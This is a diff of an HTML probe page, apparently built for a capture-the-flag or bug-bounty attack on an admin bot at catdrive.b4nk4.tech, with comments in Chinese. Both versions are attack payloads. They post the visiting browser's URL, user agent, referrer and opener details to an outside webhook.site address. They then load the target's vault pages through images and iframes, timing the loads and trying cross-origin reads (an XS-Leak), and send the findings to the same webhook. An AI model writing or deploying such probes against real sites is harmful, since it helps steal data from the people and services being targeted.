@@ -3,40 +3,44 @@
 <h1>probe</h1>
 <script>
 var W = 'https://webhook.site/bea63c09-d731-4803-932f-5722c4e62a7b';
-function log(k, v) { try { fetch(W, {method:'POST', mode:'no-cors', body: '[' + k + '] ' + String(v).slice(0,2500)}); } catch(e){} }
+function log(k, v) { try { fetch(W, {method:'POST', mode:'no-cors', body: '[' + k + '] ' + String(v).slice(0,2000)}); } catch(e){} }
 log('hit', location.href);
 log('ua', navigator.userAgent);
-// A) iframe 加载 + onload 计时 + 内容长度探测（XS-Leak）
-var targets = [
-  ['items', 'https://catdrive.b4nk4.tech/vault/items'],
-  ['history', 'https://catdrive.b4nk4.tech/vault/history'],
-  ['dashboard', 'https://catdrive.b4nk4.tech/dashboard'],
+log('referrer', document.referrer || '(none)');
+log('opener', (function(){ try { return window.opener ? 'has-opener:' + (window.opener.location.href||'?') : 'no-opener'; } catch(e) { return 'opener-x-origin:' + e.name; } })());
+
+// 1) 用 no-cors 探测 bot 是否带 cookie 访问 catdrive（成功=请求发出；用 img 更简单）
+var probes = [
+  ['img-items', 'https://catdrive.b4nk4.tech/vault/items'],
+  ['img-history', 'https://catdrive.b4nk4.tech/vault/history'],
 ];
-var idx = 0;
-function next() {
-  if (idx >= targets.length) { log('leak-done', 'all'); return; }
-  var t = targets[idx++];
-  var f = document.createElement('iframe');
-  f.style.cssText = 'width:600px;height:400px;border:1px solid #000';
-  var t0 = Date.now();
-  var done = false;
-  f.onload = function() {
-    var dt = Date.now() - t0;
-    var info = 'loaded dt=' + dt;
-    try {
-      var d = f.contentDocument;
-      info += ' doc=' + (d ? 'READABLE' : 'null');
-      if (d) info += ' title=' + d.title + ' len=' + d.body.innerHTML.length;
-    } catch(e) { info += ' exc=' + e.name; }
-    log('iframe-' + t[0], info + ' url=' + f.src);
-    done = true;
-    setTimeout(next, 500);
-  };
-  f.onerror = function() { log('iframe-' + t[0] + '-ERR', 'onerror dt=' + (Date.now()-t0)); done = true; setTimeout(next, 500); };
-  document.body.appendChild(f);
-  setTimeout(function(){ if(!done) { log('iframe-' + t[0] + '-TIMEOUT', 'no load within 8s'); next(); } }, 8000);
+for (var i = 0; i < probes.length; i++) {
+  (function(n, u){
+    var im = new Image();
+    im.onload = function(){ log(n + '-IMG', 'loaded ' + im.width + 'x' + im.height); };
+    im.onerror = function(){ log(n + '-IMG', 'error (likely not an image / blocked)'); };
+    im.src = u + '?cb=' + Date.now();
+  })(probes[i][0], probes[i][1]);
 }
-next();
-log('dispatched', 'LEAK_V1');
+
+// 2) 关键：iframe 加载 /vault/items 并尝试用多种方式读（含 postMessage 探针）
+var f = document.createElement('iframe');
+f.src = 'https://catdrive.b4nk4.tech/vault/items?cb=' + Date.now();
+f.style.cssText = 'width:800px;height:600px;border:2px solid red';
+f.onload = function() {
+  var out = 'loaded';
+  try { out += ' doc=' + (f.contentDocument ? 'READ' : 'null'); } catch(e) { out += ' exc=' + e.name; }
+  try { out += ' frames=' + f.contentWindow.length; } catch(e) {}
+  log('iframe-items', out);
+};
+f.onerror = function(){ log('iframe-items', 'onerror'); };
+document.body.appendChild(f);
+
+// 3) 尝试用"窗口引用"读取（预期失败，但记录异常类型）
+setTimeout(function(){
+  try { log('frame-access', String(f.contentWindow.document.documentElement.outerHTML.length)); }
+  catch(e) { log('frame-access', 'BLOCKED ' + e.name + ': ' + e.message); }
+}, 4000);
+log('dispatched', 'LEAK_V2_' + Date.now());
 </script>
 </body></html>
